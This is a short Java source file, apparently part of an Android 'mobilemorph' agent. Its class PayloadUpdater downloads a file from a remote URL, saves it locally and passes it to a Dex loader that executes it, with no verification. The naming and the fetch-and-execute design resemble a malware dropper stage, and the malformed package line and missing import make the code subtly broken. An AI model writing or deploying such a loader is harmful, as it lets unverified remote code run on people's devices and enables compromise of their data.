package src.main.java.com.mobilemorph.agent.util;

public class PayloadUpdater {
    public static void updateAndLoad(Context context, String remoteUrl, String localPath) {
        try {
            java.net.URL url = new java.net.URL(remoteUrl);
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setDoInput(true);

            java.io.InputStream is = conn.getInputStream();
            java.io.File outFile = new java.io.File(localPath);
            java.io.FileOutputStream fos = new java.io.FileOutputStream(outFile);

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
            }
            fos.close(); is.close();

            // Load updated payload
            DexLoader.loadAndExecute(context, localPath);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
